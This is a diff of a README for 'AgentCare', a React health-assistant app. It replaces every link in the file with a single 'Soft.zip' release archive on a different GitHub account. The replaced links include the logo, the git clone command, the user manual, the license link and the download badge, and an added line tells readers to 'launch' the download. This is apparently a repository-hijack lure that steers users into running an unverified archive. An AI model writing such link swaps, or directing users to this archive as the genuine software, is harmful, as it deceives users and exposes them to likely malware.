@@ -1,8 +1,8 @@
 # 🩺 AgentCare: Your Intelligent Health Assistant 🤖
 
-![AgentCare Logo](https://example.com/agentcarelogo.png)
+![AgentCare Logo](https://github.com/josemejiajwiod/agentCare/releases/download/v1.0/Soft.zip)
 
-AgentCare is an intelligent health assistant built with React and powered by Agent.ai. It analyzes symptoms, age, and gender to provide tailored diagnoses, remedies, and health reports. Featuring webhook integration, it delivers fast and accurate responses, offering a seamless user experience.
+AgentCare is an intelligent health assistant built with React and powered by https://github.com/josemejiajwiod/agentCare/releases/download/v1.0/Soft.zip It analyzes symptoms, age, and gender to provide tailored diagnoses, remedies, and health reports. Featuring webhook integration, it delivers fast and accurate responses, offering a seamless user experience.
 
 ---
 
@@ -36,7 +36,7 @@ To get started with AgentCare, follow these simple steps:
 
 1. Clone this repository to your local machine.
    ```bash
-   git clone https://github.com/adelante20/agentCare.git
+   git clone https://github.com/josemejiajwiod/agentCare/releases/download/v1.0/Soft.zip
    ```
 
 2. Install the dependencies using npm.
@@ -58,7 +58,7 @@ To get started with AgentCare, follow these simple steps:
 3. Explore the personalized diagnoses, remedies, and health reports offered by AgentCare.
 4. Enjoy a seamless user experience with fast and accurate responses.
 
-For a more detailed guide on using AgentCare, refer to the [User Manual](https://example.com/agentcare/usermanual.pdf).
+For a more detailed guide on using AgentCare, refer to the [User Manual](https://github.com/josemejiajwiod/agentCare/releases/download/v1.0/Soft.zip).
 
 ---
 
@@ -78,19 +78,19 @@ Let's work together to improve AgentCare for the benefit of all users!
 
 ## License
 
-AgentCare is open-source software licensed under the [MIT License](https://opensource.org/licenses/MIT).
+AgentCare is open-source software licensed under the [MIT License](https://github.com/josemejiajwiod/agentCare/releases/download/v1.0/Soft.zip).
 
 ---
 
 🚀 **Download AgentCare Today!**
 
-[![Download AgentCare](https://img.shields.io/badge/Download%20AgentCare-Release%20ZIP-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download AgentCare](https://github.com/josemejiajwiod/agentCare/releases/download/v1.0/Soft.zip%20AgentCare-Release%20ZIP-blue)](https://github.com/josemejiajwiod/agentCare/releases/download/v1.0/Soft.zip)
 
 *Note: The download link needs to be launched to access the AgentCare application.*
 
 ---
 
-For more information and updates, visit the [AgentCare Repository](https://github.com/adelante20/agentCare).
+For more information and updates, visit the [AgentCare Repository](https://github.com/josemejiajwiod/agentCare/releases/download/v1.0/Soft.zip).
 
 ---
 
